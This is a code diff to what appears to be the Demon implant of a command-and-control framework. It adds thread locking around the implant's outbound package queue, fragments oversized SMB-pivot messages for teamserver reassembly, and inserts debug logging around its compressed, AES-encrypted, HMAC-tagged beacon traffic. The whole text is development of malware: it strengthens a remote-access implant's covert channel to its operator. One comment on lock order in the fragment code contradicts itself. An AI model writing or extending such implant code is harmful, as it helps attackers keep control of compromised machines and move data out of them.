@@ -198,25 +198,14 @@ PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )
     return Package;
 }
 
-VOID PackageDestroy(
+/* Internal destroy — caller must hold PACKAGES_LOCK or guarantee
+ * the package is not on Instance->Packages (e.g., the GET_JOB
+ * wrapper created inside PackageTransmitAll). */
+static VOID PackageDestroyInner(
     IN PPACKAGE Package
 ) {
-    PPACKAGE Pkg = Instance->Packages;
-
     if ( Package )
     {
-        // make sure the package is not on the Instance->Packages list, avoid UAF
-        while ( Pkg )
-        {
-            if ( Package == Pkg )
-            {
-                PUTS_DONT_SEND( "Package can't be destroyed, is on Instance->Packages list" )
-                return;
-            }
-
-            Pkg = Pkg->Next;
-        }
-
         if ( Package->Buffer )
         {
             MemSet( Package->Buffer, 0, Package->Length );
@@ -226,7 +215,32 @@ VOID PackageDestroy(
 
         MemSet( Package, 0, sizeof( PACKAGE ) );
         Instance->Win32.LocalFree( Package );
-        Package = NULL;
+    }
+}
+
+VOID PackageDestroy(
+    IN PPACKAGE Package
+) {
+    if ( Package )
+    {
+        // make sure the package is not on the Instance->Packages list, avoid UAF.
+        PACKAGES_LOCK();
+        {
+            PPACKAGE Pkg = Instance->Packages;
+            while ( Pkg )
+            {
+                if ( Package == Pkg )
+                {
+                    PUTS_DONT_SEND( "Package can't be destroyed, is on Instance->Packages list" )
+                    PACKAGES_UNLOCK();
+                    return;
+                }
+                Pkg = Pkg->Next;
+            }
+        }
+        PACKAGES_UNLOCK();
+
+        PackageDestroyInner( Package );
     }
 }
 
@@ -239,6 +253,12 @@ BOOL PackageTransmitNow(
     AESCTX AesCtx  = { 0 };
     BOOL   Success = FALSE;
     UINT32 Padding = 0;
+
+    PRINTF( "PackageTransmitNow: ENTRY Package=%p CommandID=%d Length=%lu Encrypt=%d\n",
+            Package,
+            Package ? Package->CommandID : 0,
+            Package ? (unsigned long) Package->Length : 0,
+            Package ? Package->Encrypt : 0 )
 
     if ( Package )
     {
@@ -317,6 +337,7 @@ BOOL PackageTransmitNow(
         Success = FALSE;
     }
 
+    PRINTF( "PackageTransmitNow: EXIT Success=%d\n", Success )
     return Success;
 }
 
@@ -333,29 +354,66 @@ VOID PackageTransmit(
     }
 
 #if TRANSPORT_SMB
-        // if the package is larger than PIPE_BUFFER_MAX, discard it
-        // TODO: support packet fragmentation
-
-        // size + demon-magic + agent-id + command-id + request-id +
-        // command-id + request-id + buffer-size + Package->Length
+        /* [ISSUE-5] If a single package exceeds PIPE_BUFFER_MAX, split it into
+         * fragment packages that each fit within the pipe limit.  Each fragment
+         * carries a header: [FragID][SeqNum][TotalFrags][OrigCmdID][OrigReqID]
+         * followed by a chunk of the original buffer.  The teamserver reassembles
+         * fragments by FragID before dispatching the reconstructed command. */
         if ( sizeof( UINT32 ) * 8 + Package->Length > PIPE_BUFFER_MAX )
         {
-            PRINTF( "Trying to send a package that is 0x%x bytes long, which is longer than PIPE_BUFFER_MAX, discarding...\n", Package->Length )
+            UINT32   FragID      = RandomNumber32();
+            UINT32   TotalFrags  = ( Package->Length + SMB_FRAG_MAX_DATA - 1 ) / SMB_FRAG_MAX_DATA;
+            UINT32   OrigCmdID   = Package->CommandID;
+            UINT32   OrigReqID   = Package->RequestID;
+            SIZE_T   Remaining   = Package->Length;
+            SIZE_T   Offset      = 0;
+            UINT32   Seq         = 0;
 
-            RequestID = Package->RequestID;
-            Length    = Package->Length;
+            PRINTF( "PackageTransmit: fragmenting package 0x%x bytes into %d fragments (FragID=%08x)\n",
+                    Package->Length, TotalFrags, FragID )
 
-            // destroy the package
-            if ( Package->Destroy ) {
-                PackageDestroy( Package );
+            while ( Remaining > 0 )
+            {
+                SIZE_T   ChunkSize = ( Remaining > SMB_FRAG_MAX_DATA ) ? SMB_FRAG_MAX_DATA : Remaining;
+                PPACKAGE FragPkg   = PackageCreate( DEMON_PACKAGE_FRAGMENT );
+
+                FragPkg->RequestID = OrigReqID;
+
+                PackageAddInt32( FragPkg, FragID );
+                PackageAddInt32( FragPkg, Seq );
+                PackageAddInt32( FragPkg, TotalFrags );
+                PackageAddInt32( FragPkg, OrigCmdID );
+                PackageAddInt32( FragPkg, OrigReqID );
+                PackageAddBytes( FragPkg, (PBYTE) Package->Buffer + Offset, ChunkSize );
+
+                /* Append fragment to the packages list (lock already acquired
+                 * by the PACKAGES_LOCK below, or will be — we queue first,
+                 * then fall through to the list-append code). */
+                PACKAGES_LOCK();
+                if ( ! Instance->Packages ) {
+                    Instance->Packages = FragPkg;
+                } else {
+                    PPACKAGE Tail = Instance->Packages;
+                    while ( Tail->Next ) { Tail = Tail->Next; }
+                    Tail->Next = FragPkg;
+                }
+                PACKAGES_UNLOCK();
+
+                Offset    += ChunkSize;
+                Remaining -= ChunkSize;
+                Seq++;
             }
 
-            // notify the operator that a package was discarded
-            Package = PackageCreateWithRequestID( DEMON_PACKAGE_DROPPED, RequestID );
-            PackageAddInt32( Package, Length );
-            PackageAddInt32( Package, PIPE_BUFFER_MAX );
+            /* Destroy the original oversized package */
+            if ( Package->Destroy ) {
+                PackageDestroyInner( Package );
+            }
+
+            return;
         }
 #endif
+
+    PACKAGES_LOCK();
 
     if ( ! Instance->Packages )
     {
@@ -370,6 +428,8 @@ VOID PackageTransmit(
         }
         List->Next = Package;
     }
+
+    PACKAGES_UNLOCK();
 }
 
 // transmit all stored packages in a single request
@@ -389,11 +449,20 @@ BOOL PackageTransmitAll(
     PPACKAGE Entry   = NULL;
     PPACKAGE Prev    = NULL;
 
+    PUTS( "PackageTransmitAll: ENTRY" )
+
+    /* Lock the packages list while reading and marking entries.
+     * The lock is released before the blocking TransportSend call
+     * and re-acquired for the cleanup phase. */
+    PACKAGES_LOCK();
+
 #if TRANSPORT_SMB
     // SMB pivots don't need to send DEMON_COMMAND_GET_JOB
     // so if we don't having nothing to send, simply exit
-    if ( ! Instance->Packages )
+    if ( ! Instance->Packages ) {
+        PACKAGES_UNLOCK();
         return TRUE;
+    }
 #endif
 
     Package = PackageCreateWithMetaData( DEMON_COMMAND_GET_JOB );
@@ -422,6 +491,10 @@ BOOL PackageTransmitAll(
         Prev = Pkg;
         Pkg  = Pkg->Next;
     }
+
+    /* Release lock before the blocking network send. Background threads
+     * can safely append new packages while we're transmitting. */
+    PACKAGES_UNLOCK();
 
     // writes package length to buffer
     Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );
@@ -474,10 +547,14 @@ BOOL PackageTransmitAll(
                     if ( NT_SUCCESS( CmpStatus ) && CompressedLen < Package->Length - Padding )
                     {
                         PayloadCompressed = TRUE;
+                        PRINTF( "PackageTransmitAll: LZNT1 compressed %lu -> %lu bytes\n",
+                                (unsigned long) ( Package->Length - Padding ),
+                                (unsigned long) CompressedLen )
                     }
                     else
                     {
                         /* Compression failed or expanded data — fall back to plaintext */
+                        PUTS( "PackageTransmitAll: LZNT1 compression skipped (expanded or failed)" )
                         Instance->Win32.LocalFree( CompressedBuf );
                         CompressedBuf = NULL;
                         CompressedLen = 0;
@@ -514,6 +591,10 @@ BOOL PackageTransmitAll(
          * otherwise fall back to the original plaintext payload. */
         PUCHAR EncPayload = PayloadCompressed ? CompressedBuf              : Package->Buffer + Padding;
         UINT32 EncLen     = PayloadCompressed ? CompressedLen              : Package->Length - Padding;
+
+        PRINTF( "PackageTransmitAll: encrypt PayloadLen=%lu Padding=%lu Compressed=%d\n",
+                (unsigned long) EncLen, (unsigned long) Padding, PayloadCompressed )
+        PRINT_HEX( RandIV, 16 )
 
         /* Encrypt payload region using the fresh random IV */
         AesInit( &AesCtx, Instance->Config.AES.Key, RandIV );
@@ -577,8 +658,13 @@ BOOL PackageTransmitAll(
 
             MemSet( Tag, 0, sizeof( Tag ) );
 
+            PRINTF( "PackageTransmitAll: TransportSend AuthWireLength=%lu (Wire=%lu + HMAC=32)\n",
+                    (unsigned long) AuthWireLength, (unsigned long) WireLength )
             if ( TransportSend( AuthWireBuffer, AuthWireLength, Response, Size ) ) {
                 Success = TRUE;
+                PRINTF( "PackageTransmitAll: TransportSend OK Response=%p ResponseSize=%llu\n",
+                        Response ? *Response : NULL,
+                        (unsigned long long) ( Size ? *Size : 0 ) )
             } else {
                 PUTS_DONT_SEND("TransportSend failed!")
             }
@@ -603,6 +689,10 @@ BOOL PackageTransmitAll(
         }
     }
 
+    /* Re-acquire the lock for cleanup — background threads may have
+     * appended new packages during the send. */
+    PACKAGES_LOCK();
+
     Entry = Instance->Packages;
     Prev  = NULL;
 
@@ -620,9 +710,9 @@ BOOL PackageTransmitAll(
                     // update the start of the list
                     Instance->Packages = Entry->Next;
 
-                    // remove the entry if required
+                    // remove the entry if required (use inner — lock is held)
                     if ( Entry->Destroy ) {
-                        PackageDestroy( Entry ); Entry = NULL;
+                        PackageDestroyInner( Entry ); Entry = NULL;
                     }
 
                     Entry = Instance->Packages;
@@ -635,9 +725,9 @@ BOOL PackageTransmitAll(
                         // remove the entry from the list
                         Prev->Next = Entry->Next;
 
-                        // remove the entry if required
+                        // remove the entry if required (use inner — lock is held)
                         if ( Entry->Destroy ) {
-                            PackageDestroy( Entry ); Entry = NULL;
+                            PackageDestroyInner( Entry ); Entry = NULL;
                         }
 
                         Entry = Prev->Next;
@@ -666,8 +756,11 @@ BOOL PackageTransmitAll(
         }
     }
 
+    PACKAGES_UNLOCK();
+
     PackageDestroy( Package ); Package = NULL;
 
+    PRINTF( "PackageTransmitAll: EXIT Success=%d\n", Success )
     return Success;
 }
 
